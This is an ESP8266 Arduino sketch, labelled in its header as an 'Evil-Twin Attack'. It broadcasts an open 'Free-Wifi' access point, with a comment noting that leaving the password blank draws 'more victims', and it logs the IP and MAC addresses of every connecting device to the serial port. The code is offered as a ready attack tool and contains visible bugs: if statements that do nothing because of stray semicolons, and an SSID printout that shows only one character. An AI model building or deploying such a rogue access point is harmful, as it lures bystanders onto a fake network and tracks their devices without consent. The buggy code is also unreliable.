
/*
-------------  README  --------------
-------------------------------------

Project: Evil-Twin Attack Using ESP8266 
Author: Aziz Becha
Licence: Project Saved Under Aziz Becha
Github profile: github.com/AzizVirus
Follow My Github to Receive The Updates

------------------------------------
------------------------------------
*/

#include <ESP8266WiFi.h>
 extern "C" {
#include<user_interface.h>
}

const char *ssid = "Free-Wifi"; // here you choose the name of the Acces Point
const char *pass = "";         // here you select the password of the Acces Point (let it blank for more victims)
 
void setup() {
  pinMode(BUILTIN_LED, OUTPUT);
  delay(1000);
  Serial.begin(115200);
  Serial.println();
  Serial.print("Configuring access point...");
  Serial.println("");
  Serial.println(*ssid);
  Serial.println(*pass);

  WiFi.softAP(ssid,pass);
  
  IPAddress myIP = WiFi.softAPIP();
  
  Serial.println("AP IP address: 192.168.4.1");
}
 
void loop() {
  delay(500);
  client_status();
  delay(1000);
}
 
void client_status() {
 digitalWrite(BUILTIN_LED, LOW); 
 delay(200);
 digitalWrite(BUILTIN_LED, HIGH);
 delay(200); 
  unsigned char number_client;
  struct station_info *stat_info; 
  struct ip4_addr *IPaddress;
  IPAddress address;
  int i=1;
  number_client= wifi_softap_get_station_num();
  stat_info = wifi_softap_get_station_info(); 
  Serial.print("Connected Devices : ");
  Serial.println(number_client);
    while (stat_info != NULL) {
      IPaddress = &stat_info->ip;
      address = IPaddress->addr;
      Serial.print("client ");
      Serial.print(i);
      Serial.print(" info : ");
      Serial.print(" IP address = ");
      Serial.print((address));
      Serial.print(" MAC address = ");
      Serial.print(stat_info->bssid[0],HEX);Serial.print(" ");
      Serial.print(stat_info->bssid[1],HEX);Serial.print(" ");
      Serial.print(stat_info->bssid[2],HEX);Serial.print(" ");
      Serial.print(stat_info->bssid[3],HEX);Serial.print(" ");
      Serial.print(stat_info->bssid[4],HEX);Serial.print(" ");
      Serial.print(stat_info->bssid[5],HEX);Serial.print(" ");
      stat_info = STAILQ_NEXT(stat_info, next);
      i++;
      Serial.println();
      if ((number_client) > 0);
      digitalWrite(BUILTIN_LED, HIGH);
      if ((number_client) < 0);
      digitalWrite(BUILTIN_LED, LOW);
    }
  delay(500); 
}
